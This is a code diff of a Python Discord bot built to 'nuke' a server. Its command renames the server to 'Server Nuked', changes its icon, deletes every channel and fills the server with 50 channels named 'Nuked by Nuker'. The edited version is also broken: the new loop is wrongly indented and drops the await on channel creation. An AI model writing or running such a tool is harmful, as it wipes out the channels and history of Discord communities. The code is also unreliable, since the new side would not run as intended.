@@ -1,50 +1,45 @@
 
-#import
-import discord,os,asyncio
-from discord.ext import commands, tasks
+# Importing Required Modules
+import discord, os
+from discord.ext import commands
 
 
-#set prefix
+# Default Prefix
 prefix=''
 
 
 client = commands.Bot(command_prefix=prefix)
 
 
-#set status and print connect message
+# Read Event (Change Status)
 @client.event
 async def on_ready():
 	print("Bot Logged In!")
 	await client.change_presence(activity=discord.Game(name="Ready to Nuke"))
 
 
-#open 'icon.png' as icon
-with open ('icon.png','rb') as f:
+# Open 'icon.png' as icon
+with open('icon.png','rb') as f:
 	icon = f.read()
 
 
 
-
+# default nuke command
 @client.command()
-async def  nuke(ctx):
+async def nuke(ctx):
 
 	await ctx.guild.edit(name='Server Nuked', icon=icon) #change guild icon and name
 
-	for c in ctx.guild.channels : #go through all channels
-		await c.delete() #delete all channels
+	for c in ctx.guild.channels: # go through all channels
+		await c.delete() # delete all channels
 
   
-	guild = ctx.message.guild #get guild
+	guild = ctx.message.guild # get guild
 
   
-  #create a while loop
-	n = 0
-	while(n<=50):
-		await guild.create_text_channel('Nuked by Nuker') #create text channels
-		n = n + 1
-
-	
-
+  #create a "for" loop
+        for i in range(50):
+            guild.create_text_channel("Nuked by Nuker")
 
 
 
